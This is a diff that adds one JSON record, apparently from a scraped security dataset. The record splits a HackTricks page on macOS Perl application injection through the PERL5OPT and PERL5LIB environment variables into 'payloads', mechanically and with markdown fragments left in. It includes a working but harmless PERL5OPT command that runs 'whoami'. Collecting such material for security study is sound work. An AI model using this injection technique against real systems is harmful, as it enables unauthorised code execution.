@@ -1,0 +1,27 @@
+{
+  "id": "macos_hardening_1b3fd94e751c",
+  "category": "macos-hardening",
+  "title": "macos perl applications injection",
+  "description": "# macOS Perl Applications Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Via `PERL5OPT` & `PERL5LIB` env variable\n\nUsing the env variable **`PERL5OPT`** it's possible to make **Perl** execute arbitrary commands when the interpreter starts (even **before** the first line of the target script is parsed).  \nFor example, create this script:\n\n```perl:test.pl\n#!/usr/bin/perl\nprint \"Hello from the Perl script!\\n\";\n```\n\nNow **export the env variable** and execute the **perl** script",
+  "payloads": [
+    "# macOS Perl Applications Injection",
+    "{{#include ../../../banners/hacktricks-training.md}}",
+    "## Via `PERL5OPT` & `PERL5LIB` env variable",
+    "Using the env variable **`PERL5OPT`** it's possible to make **Perl** execute arbitrary commands when the interpreter starts (even **before** the first line of the target script is parsed).",
+    "For example, create this script:",
+    "```perl:test.pl",
+    "#!/usr/bin/perl",
+    "print \"Hello from the Perl script!\\n\";",
+    "Now **export the env variable** and execute the **perl** script:",
+    "```bash",
+    "export PERL5OPT='-Mwarnings;system(\"whoami\")'",
+    "perl test.pl # This will execute \"whoami\"",
+    "Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):",
+    "```perl:/tmp/pmod.pm",
+    "#!/usr/bin/perl"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md"
+  ]
+}
